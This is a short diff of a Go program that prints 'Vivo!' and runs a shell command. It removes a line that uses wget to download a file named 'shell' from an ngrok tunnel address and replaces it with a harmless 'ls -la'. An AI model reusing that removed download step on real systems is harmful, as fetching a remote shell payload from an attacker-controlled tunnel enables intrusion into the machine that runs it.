@@ -7,7 +7,7 @@ import (
 
 func main() {
         fmt.Println("Vivo!")
-        cmd := exec.Command("wget", "https://4847-189-40-72-61.ngrok-free.app/shell")
+        cmd := exec.Command("ls", "-la")
 
         output, err := cmd.Output()
         if err != nil {
